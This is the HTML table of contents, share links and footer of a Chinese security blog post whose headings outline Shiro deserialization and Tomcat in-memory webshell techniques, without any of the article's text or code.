        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">shiro反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.</span> <span class="toc-text">利用脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat%E5%86%85%E5%AD%98webshell"><span class="toc-number">2.</span> <span class="toc-text">Tomcat内存webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%8A%E4%B8%8B%E6%96%87%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.1.</span> <span class="toc-text">获取上下文对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8CFilter"><span class="toc-number">2.2.</span> <span class="toc-text">注册Filter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87StandardContext"><span class="toc-number">2.2.1.</span> <span class="toc-text">通过StandardContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87ApplicationContext"><span class="toc-number">2.2.2.</span> <span class="toc-text">通过ApplicationContext</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8Eshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%BB%93%E5%90%88"><span class="toc-number">3.</span> <span class="toc-text">与shiro反序列化漏洞结合</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E2%80%9CRequest-header-is-too-large%E2%80%9D"><span class="toc-number">4.</span> <span class="toc-text">解决“Request header is too large”</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">加载字节码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9size"><span class="toc-number">4.2.</span> <span class="toc-text">修改size</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%82%E9%85%8D%E5%86%B0%E8%9D%8E"><span class="toc-number">5.</span> <span class="toc-text">适配冰蝎</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&text=shiro反序列化写入内存马"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&title=shiro反序列化写入内存马"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=shiro反序列化写入内存马"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=shiro反序列化写入内存马&body=Check out this article: http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&title=shiro反序列化写入内存马"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&title=shiro反序列化写入内存马"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&title=shiro反序列化写入内存马"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&title=shiro反序列化写入内存马"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&name=shiro反序列化写入内存马&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&t=shiro反序列化写入内存马"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    yy
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/yaoyao-cool">项目</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
